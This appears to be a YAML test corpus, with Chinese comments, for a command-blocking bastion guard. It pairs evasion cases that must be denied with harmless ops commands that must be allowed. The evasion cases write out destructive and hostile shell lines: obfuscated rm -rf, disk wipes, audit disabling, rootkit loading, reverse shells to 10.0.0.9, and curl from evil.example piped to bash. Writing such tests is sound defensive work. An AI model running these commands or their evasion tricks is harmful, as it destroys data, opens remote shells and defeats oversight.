@@ -1,0 +1,572 @@
+# BastionGuard 绕过样本语料库
+#
+# 每个样本描述一种真实攻击/绕过手法。expect_deny=true 表示必须被拦截；
+# class=benign 的正常运维样本 expect_deny=false，用来回归误报率。
+# lines 按顺序在同一会话内执行，用于验证别名/变量/虚拟 FS 等跨命令状态。
+
+cases:
+  # ---------- 1. 别名/函数包装 ----------------------------------------
+  - id: BP-001
+    class: bypass
+    technique: alias
+    description: 用别名把 rm 包装成无害名字
+    expect_deny: true
+    lines: ["alias cleaner='rm -rf /var/lib/mysql'", "cleaner"]
+
+  - id: BP-002
+    class: bypass
+    technique: alias
+    description: 别名加引号拆分命令名
+    expect_deny: true
+    lines: ["alias x='r''m'", "x -rf /etc"]
+
+  - id: BP-003
+    class: bypass
+    technique: function
+    description: 定义 shell 函数包裹删除
+    expect_deny: true
+    lines: ["dbdrop() { rm -rf \"$1\"; }", "dbdrop /var/lib/mysql"]
+
+  # ---------- 2. 变量拼接/切片 ----------------------------------------
+  - id: BP-010
+    class: bypass
+    technique: variable-concat
+    description: 路径拆进变量再拼接
+    expect_deny: true
+    lines: ["D=/var/lib/mysql", "rm -rf $D"]
+
+  - id: BP-011
+    class: bypass
+    technique: variable-slice
+    description: 用 ${x:offset:length} 切片拼出 rm 命令名
+    expect_deny: true
+    lines: ["x=armless; y=${x:1:2}", "$y -rf /var/lib/mysql"]
+
+  - id: BP-012
+    class: bypass
+    technique: variable-default
+    description: 利用 ${a:-default} 默认值构造路径
+    expect_deny: true
+    lines: ["rm -rf ${UNUSED:-/var/lib/mysql}"]
+
+  - id: BP-013
+    class: bypass
+    technique: variable-glue
+    description: 多段变量拼接成完整命令
+    expect_deny: true
+    lines: ["A=r; B=m; $A$B -rf /etc"]
+
+  # ---------- 3. 写脚本再执行 -----------------------------------------
+  - id: BP-020
+    class: bypass
+    technique: script-file
+    description: heredoc 写脚本到 /tmp 再用 bash 执行
+    expect_deny: true
+    lines:
+      - "cat > /tmp/clean.sh <<'EOF'\nrm -rf /var/lib/mysql\nEOF"
+      - "bash /tmp/clean.sh"
+
+  - id: BP-021
+    class: bypass
+    technique: script-source
+    description: source 一个含高危操作的脚本
+    expect_deny: true
+    lines:
+      - "printf 'rm -rf /var/lib/mysql\n' > /tmp/s.sh"
+      - "source /tmp/s.sh"
+
+  # ---------- 4. 编码包裹 ---------------------------------------------
+  - id: BP-030
+    class: bypass
+    technique: base64-pipe
+    description: base64 编码 rm 后管道解码执行
+    expect_deny: true
+    lines: ["echo cm0gLXJmIC92YXIvbGliL215c3FsCg== | base64 -d | sh"]
+
+  - id: BP-031
+    class: bypass
+    technique: base64-flag
+    description: base64 -d 解码后用 bash -c 执行
+    expect_deny: true
+    lines: ["P=$(echo cm0gLXJmIC9ldGMK | base64 -d); bash -c \"$P\""]
+
+  - id: BP-032
+    class: bypass
+    technique: hex-xxd
+    description: xxd 还原十六进制载荷（无法静态解密应 fail-closed）
+    expect_deny: true
+    lines: ["echo 726d202d7266202f6574630a | xxd -r -p | bash"]
+
+  - id: BP-033
+    class: bypass
+    technique: openssl-enc
+    description: openssl 加密载荷管道给 shell，无法还原应兜底拦截
+    expect_deny: true
+    lines: ["openssl enc -d -base64 -in payload.enc | sh"]
+
+  # ---------- 5. 命令替换/嵌套 ----------------------------------------
+  - id: BP-040
+    class: bypass
+    technique: cmd-substitution
+    description: $(echo) 构造删除目标
+    expect_deny: true
+    lines: ["rm -rf $(echo /var/lib/mysql)"]
+
+  - id: BP-041
+    class: bypass
+    technique: backtick
+    description: 反引号命令替换
+    expect_deny: true
+    lines: ["rm -rf `echo /etc`"]
+
+  - id: BP-042
+    class: bypass
+    technique: eval
+    description: eval 拼接执行，引号分段
+    expect_deny: true
+    lines: ["eval 'r''m -rf /var/lib/mysql'"]
+
+  # ---------- 6. find/xargs 间接删除 ----------------------------------
+  - id: BP-050
+    class: bypass
+    technique: find-exec
+    description: find -exec 调 rm 删除数据库文件
+    expect_deny: true
+    lines: ["find /var/lib/mysql -name '*.ibd' -exec rm -f {} +"]
+
+  - id: BP-051
+    class: bypass
+    technique: find-delete
+    description: find -delete 直接批量删
+    expect_deny: true
+    lines: ["find /var/lib/mysql -type f -delete"]
+
+  - id: BP-052
+    class: bypass
+    technique: xargs-pipe
+    description: find 管道 xargs rm，参数动态
+    expect_deny: true
+    lines: ["find /data -name '*.log' | xargs rm -f"]
+
+  # ---------- 7. 提权包裹 ---------------------------------------------
+  - id: BP-060
+    class: bypass
+    technique: sudo-wrap
+    description: sudo 包裹的递归删除
+    expect_deny: true
+    lines: ["sudo rm -rf /etc"]
+
+  - id: BP-061
+    class: bypass
+    technique: sudo-env
+    description: env 绕过再 sudo
+    expect_deny: true
+    lines: ["sudo env PATH=/tmp:$PATH rm -rf /var/lib/mysql"]
+
+  # ---------- 8. 远程跳转执行 -----------------------------------------
+  - id: BP-070
+    class: bypass
+    technique: ssh-remote
+    description: ssh 到数据库主机执行删库
+    expect_deny: true
+    lines: ["ssh db-01 'rm -rf /var/lib/mysql'"]
+
+  - id: BP-071
+    class: bypass
+    technique: ssh-tunnel
+    description: ssh 反向端口转发建立隧道
+    expect_deny: true
+    lines: ["ssh -R 9000:localhost:3306 bastion-host"]
+
+  - id: BP-072
+    class: bypass
+    technique: ssh-encoded
+    description: ssh 远程执行 base64 包裹的命令
+    expect_deny: true
+    lines: ["ssh db-01 \"echo cm0gLXJmIC8K | base64 -d | sh\""]
+
+  # ---------- 9. 重定向/截断 ------------------------------------------
+  - id: BP-080
+    class: bypass
+    technique: redirect-truncate
+    description: 冒号加重定向清空系统账号文件
+    expect_deny: true
+    lines: [": > /etc/passwd"]
+
+  - id: BP-081
+    class: bypass
+    technique: redirect-blockdev
+    description: 重定向覆写裸盘
+    expect_deny: true
+    lines: ["cat payload.bin > /dev/sda"]
+
+  # ---------- 10. 磁盘/块设备 -----------------------------------------
+  - id: BP-090
+    class: bypass
+    technique: dd-blockdev
+    description: dd 写零到系统盘
+    expect_deny: true
+    lines: ["dd if=/dev/zero of=/dev/sda bs=1M count=1"]
+
+  - id: BP-091
+    class: bypass
+    technique: mkfs
+    description: 对数据盘重新建文件系统
+    expect_deny: true
+    lines: ["mkfs.ext4 -F /dev/vdb"]
+
+  - id: BP-092
+    class: bypass
+    technique: disk-fill
+    description: /dev/zero 生成大文件占满磁盘
+    expect_deny: true
+    lines: ["dd if=/dev/zero of=/data/huge.bin bs=1G count=50"]
+
+  # ---------- 11. 审计/痕迹 -------------------------------------------
+  - id: BP-100
+    class: bypass
+    technique: stop-audit
+    description: 停止审计服务
+    expect_deny: true
+    lines: ["systemctl stop auditd"]
+
+  - id: BP-101
+    class: bypass
+    technique: disable-audit
+    description: 禁用审计开机自启
+    expect_deny: true
+    lines: ["systemctl disable auditd"]
+
+  - id: BP-102
+    class: bypass
+    technique: clear-history
+    description: 清空命令历史
+    expect_deny: true
+    lines: ["history -c"]
+
+  - id: BP-103
+    class: bypass
+    technique: audit-rules
+    description: auditctl 删除全部审计规则
+    expect_deny: true
+    lines: ["auditctl -D"]
+
+  - id: BP-104
+    class: bypass
+    technique: remove-logs
+    description: 递归删除日志目录
+    expect_deny: true
+    lines: ["rm -rf /var/log/audit"]
+
+  # ---------- 12. 可用性 ----------------------------------------------
+  - id: BP-110
+    class: bypass
+    technique: shutdown
+    description: 立即关机
+    expect_deny: true
+    lines: ["shutdown -h now"]
+
+  - id: BP-111
+    class: bypass
+    technique: stop-service
+    description: 停止数据库服务
+    expect_deny: true
+    lines: ["systemctl stop mysqld"]
+
+  - id: BP-112
+    class: bypass
+    technique: kill-all
+    description: 强杀所有进程
+    expect_deny: true
+    lines: ["kill -9 -1"]
+
+  - id: BP-113
+    class: bypass
+    technique: firewall-flush
+    description: 清空防火墙规则
+    expect_deny: true
+    lines: ["iptables -F"]
+
+  # ---------- 13. 反弹 shell / 外连 -----------------------------------
+  - id: BP-120
+    class: bypass
+    technique: reverse-shell
+    description: bash /dev/tcp 反弹 shell
+    expect_deny: true
+    lines: ["bash -i >& /dev/tcp/10.0.0.9/4444 0>&1"]
+
+  - id: BP-121
+    class: bypass
+    technique: netcat-reverse
+    description: netcat -e 反弹
+    expect_deny: true
+    lines: ["nc 10.0.0.9 4444 -e /bin/bash"]
+
+  - id: BP-122
+    class: bypass
+    technique: curl-pipe-shell
+    description: 下载脚本直接执行
+    expect_deny: true
+    lines: ["curl -s http://evil.example/x.sh | bash"]
+
+  - id: BP-123
+    class: bypass
+    technique: python-reverse
+    description: python pty 反弹
+    expect_deny: true
+    lines: ["python3 -c 'import socket,pty;s=socket.socket();s.connect((\"10.0.0.9\",4444));pty.spawn(\"/bin/bash\")'"]
+
+  # ---------- 14. 容器/编排 -------------------------------------------
+  - id: BP-130
+    class: bypass
+    technique: privileged-container
+    description: 特权容器逃逸面
+    expect_deny: true
+    lines: ["docker run --privileged -it alpine sh"]
+
+  - id: BP-131
+    class: bypass
+    technique: docker-exec-rm
+    description: 容器内执行删除（递归审查）
+    expect_deny: true
+    lines: ["docker exec db-container rm -rf /var/lib/mysql"]
+
+  - id: BP-132
+    class: bypass
+    technique: docker-prune
+    description: 删除全部卷
+    expect_deny: true
+    lines: ["docker system prune --volumes -f"]
+
+  # ---------- 15. 数据库破坏 ------------------------------------------
+  - id: BP-140
+    class: bypass
+    technique: sql-drop
+    description: mysql 删库
+    expect_deny: true
+    lines: ["mysql -e 'DROP DATABASE orders;'"]
+
+  - id: BP-141
+    class: bypass
+    technique: sql-pipe
+    description: 管道喂入清表语句
+    expect_deny: true
+    lines: ["echo 'TRUNCATE TABLE orders;' | mysql appdb"]
+
+  - id: BP-142
+    class: bypass
+    technique: redis-flush
+    description: redis 清空所有数据
+    expect_deny: true
+    lines: ["redis-cli FLUSHALL"]
+
+  # ---------- 16. 后台/定时任务 ---------------------------------------
+  - id: BP-150
+    class: bypass
+    technique: nohup-bg
+    description: nohup 后台跑可疑脚本
+    expect_deny: true
+    lines: ["nohup bash /tmp/clean.sh &"]
+
+  - id: BP-151
+    class: bypass
+    technique: cron-persist
+    description: crontab 植入持久化（载荷递归审查到删除）
+    expect_deny: true
+    lines:
+      - "printf '0 3 * * * root rm -rf /var/lib/mysql\n' > /tmp/cron.txt"
+      - "crontab /tmp/cron.txt"
+
+  # ---------- 17. 内核/模块 -------------------------------------------
+  - id: BP-160
+    class: bypass
+    technique: kernel-module
+    description: 加载内核模块
+    expect_deny: true
+    lines: ["insmod /tmp/rootkit.ko"]
+
+  - id: BP-161
+    class: bypass
+    technique: sysctl
+    description: 关闭内核安全参数
+    expect_deny: true
+    lines: ["sysctl -w kernel.kptr_restrict=0"]
+
+  # ---------- 18. 兜底：完全动态构造 ----------------------------------
+  - id: BP-170
+    class: bypass
+    technique: fully-dynamic
+    description: 程序名完全由未知变量拼成，fail-closed 兜底
+    expect_deny: true
+    lines: ["$TOOL $ARG /var/lib/mysql"]
+
+  # ====================================================================
+  # 正常运维样本：必须全部放行，用于回归误报
+  # ====================================================================
+  - id: BN-001
+    class: benign
+    technique: normal-ops
+    description: 查看日志目录
+    expect_deny: false
+    lines: ["ls -la /var/log"]
+
+  - id: BN-002
+    class: benign
+    technique: normal-ops
+    description: 切换目录并查看路径
+    expect_deny: false
+    lines: ["cd /opt/app && pwd"]
+
+  - id: BN-003
+    class: benign
+    technique: normal-ops
+    description: 查看主机配置
+    expect_deny: false
+    lines: ["cat /etc/hosts"]
+
+  - id: BN-004
+    class: benign
+    technique: normal-ops
+    description: 过滤错误日志
+    expect_deny: false
+    lines: ["grep error /var/log/messages | head -20"]
+
+  - id: BN-005
+    class: benign
+    technique: normal-ops
+    description: 查看服务状态（非停止）
+    expect_deny: false
+    lines: ["systemctl status nginx"]
+
+  - id: BN-006
+    class: benign
+    technique: normal-ops
+    description: 查看磁盘空间
+    expect_deny: false
+    lines: ["df -h"]
+
+  - id: BN-007
+    class: benign
+    technique: normal-ops
+    description: 查看进程
+    expect_deny: false
+    lines: ["ps -ef | grep java"]
+
+  - id: BN-008
+    class: benign
+    technique: normal-ops
+    description: 跟踪应用日志
+    expect_deny: false
+    lines: ["tail -f /var/log/app.log"]
+
+  - id: BN-009
+    class: benign
+    technique: normal-ops
+    description: 普通输出
+    expect_deny: false
+    lines: ["echo 'hello world'"]
+
+  - id: BN-010
+    class: benign
+    technique: normal-ops
+    description: 内部健康检查
+    expect_deny: false
+    lines: ["curl -s https://internal.example.com/health"]
+
+  - id: BN-011
+    class: benign
+    technique: normal-ops
+    description: 只读 SQL 查询
+    expect_deny: false
+    lines: ["mysql -e 'SELECT COUNT(*) FROM orders;'"]
+
+  - id: BN-012
+    class: benign
+    technique: normal-ops
+    description: 删除临时文件（非系统路径）
+    expect_deny: false
+    lines: ["rm /tmp/junk-1234.tmp"]
+
+  - id: BN-013
+    class: benign
+    technique: normal-ops
+    description: 创建应用目录
+    expect_deny: false
+    lines: ["mkdir -p /opt/app/logs"]
+
+  - id: BN-014
+    class: benign
+    technique: normal-ops
+    description: 备份配置
+    expect_deny: false
+    lines: ["tar czf /tmp/backup.tgz /opt/app/conf"]
+
+  - id: BN-015
+    class: benign
+    technique: normal-ops
+    description: 查看容器
+    expect_deny: false
+    lines: ["docker ps"]
+
+  - id: BN-016
+    class: benign
+    technique: normal-ops
+    description: 查看 k8s pod
+    expect_deny: false
+    lines: ["kubectl get pods"]
+
+  - id: BN-017
+    class: benign
+    technique: normal-ops
+    description: 安装工具（非卸载）
+    expect_deny: false
+    lines: ["apt-get install -y htop"]
+
+  - id: BN-018
+    class: benign
+    technique: normal-ops
+    description: 命令替换取日期
+    expect_deny: false
+    lines: ["DATE=$(date +%F); echo $DATE"]
+
+  - id: BN-019
+    class: benign
+    technique: normal-ops
+    description: for 循环遍历主机名
+    expect_deny: false
+    lines: ["for h in app-01 app-02; do echo $h; done"]
+
+  - id: BN-020
+    class: benign
+    technique: normal-ops
+    description: 变量赋值与读取
+    expect_deny: false
+    lines: ["D=/opt/app; ls $D/conf"]
+
+  - id: BN-021
+    class: benign
+    technique: normal-ops
+    description: 查看审计状态（非关闭）
+    expect_deny: false
+    lines: ["systemctl status auditd"]
+
+  - id: BN-022
+    class: benign
+    technique: normal-ops
+    description: 查找临时文件（不删除）
+    expect_deny: false
+    lines: ["find /tmp -name '*.tmp' -type f"]
+
+  - id: BN-023
+    class: benign
+    technique: normal-ops
+    description: 普通权限调整在应用目录
+    expect_deny: false
+    lines: ["chmod 644 /opt/app/conf/app.yaml"]
+
+  - id: BN-024
+    class: benign
+    technique: normal-ops
+    description: 重启普通应用服务（非数据库/网络关键服务，演示放行）
+    expect_deny: false
+    lines: ["systemctl restart myapp-worker"]
